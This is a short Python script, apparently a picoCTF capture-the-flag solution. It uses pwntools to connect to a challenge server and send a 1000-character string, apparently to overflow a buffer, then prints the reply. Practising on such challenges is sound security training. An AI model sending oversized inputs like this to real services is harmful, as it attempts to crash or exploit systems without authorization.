import pwn

conn = pwn.remote('saturn.picoctf.net', 63397)
print(conn.recv(timeout=1).decode())
msg = '1'*1000
conn.sendline(msg.encode())
print(conn.recvall().decode())
conn.close()